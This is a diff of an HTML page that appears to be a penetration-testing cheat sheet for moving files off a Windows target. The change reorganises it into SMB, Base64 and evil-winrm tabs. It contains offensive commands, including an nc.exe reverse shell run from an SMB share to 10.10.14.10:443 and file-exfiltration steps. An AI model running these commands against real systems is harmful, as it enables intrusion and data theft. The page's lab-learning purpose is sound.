@@ -195,10 +195,19 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="smb">SMB</h3>
-<h4 id="start-a-local-smb-server">Start a Local SMB Server</h4>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">SMB</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Base64</button>
+
+<button data-tabset="set1" data-tabcontent="tab3" >evil-winrm</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="start-a-local-smb-server">Start a Local SMB Server</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-smbserver share . -smb2support
-</span></span></code></pre></div><h4 id="cmd">cmd</h4>
+</span></span></code></pre></div></div>
+<h4 id="cmd">cmd</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Connect to SMB server without creds</span>
 </span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Connect to SMB server with creds</span>
@@ -213,19 +222,24 @@
 </span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">/</span><span class="n">d</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Older Windows (e.g. xp), use directly</span>
 </span></span><span class="line"><span class="cl"><span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="py">exe</span> <span class="n">-e</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">10</span> <span class="mf">443</span>
-</span></span></code></pre></div><br>
-<hr>
-<h3 id="base64-encoding-for-small-binary">Base64 Encoding (for small binary)</h3>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="small-binary">Small binary</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># In target Windows</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">System.convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s1">&#39;C:\ProgramData\example.exe&#39;</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">))</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy and paste the base64 encoded binary to local Linux</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s1">&#39;&lt;BASE64_BINARY&gt;&#39;</span> <span class="p">|</span> base64 -d &gt; example.exe
 </span></span></code></pre></div><p><small><em>Note: For restricted environment</em></small></p>
-<hr>
-<h3 id="evil-winrm">Evil-winrm</h3>
+</div></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Evil-winrm built-in function</span>
 </span></span><span class="line"><span class="cl">download <span class="s2">&#34;C:\ProgramData\example.txt&#34;</span> <span class="s2">&#34;/tmp/example.txt&#34;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
